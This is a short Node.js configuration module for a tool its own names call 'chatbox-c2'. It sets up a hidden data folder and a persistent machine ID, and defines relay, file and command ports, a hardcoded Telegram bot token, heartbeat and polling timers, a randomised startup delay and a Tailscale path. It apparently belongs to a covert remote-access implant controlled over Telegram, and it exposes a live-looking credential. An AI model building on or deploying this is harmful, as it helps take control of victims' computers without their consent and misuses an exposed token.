const os = require('os');
const path = require('path');
const fs = require('fs');

const IS_DEV = false;
const DATA_DIR = path.join(os.homedir(), '.chatbox-c2');

try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e) {}

let instanceId = '';
const idPath = path.join(DATA_DIR, 'machine-id');
try {
  instanceId = fs.readFileSync(idPath, 'utf8').trim();
} catch(e) {
  instanceId = require('crypto').randomBytes(4).toString('hex');
  try { fs.writeFileSync(idPath, instanceId); } catch(e2) {}
}

module.exports = {
  RELAY_PORT: 5000,
  FS_PORT: 8080,
  CMD_PORT: 5001,
  TELEGRAM_TOKEN: '1809469058:AAGhSDi9uO0_upwjUUgYqQiwnXYfhQIMSzk',
  TELEGRAM_CHAT_ID: '',
  HEARTBEAT_INTERVAL: 120000,
  TELEGRAM_POLL_INTERVAL: 30000,
  STARTUP_DELAY_MIN: 120000,
  STARTUP_DELAY_MAX: 300000,
  TAILSCALE_PATH: 'C:\\Program Files\\Tailscale\\tailscale.exe',
  instanceId,
  DATA_DIR,
  hostname: os.hostname().toUpperCase(),
};
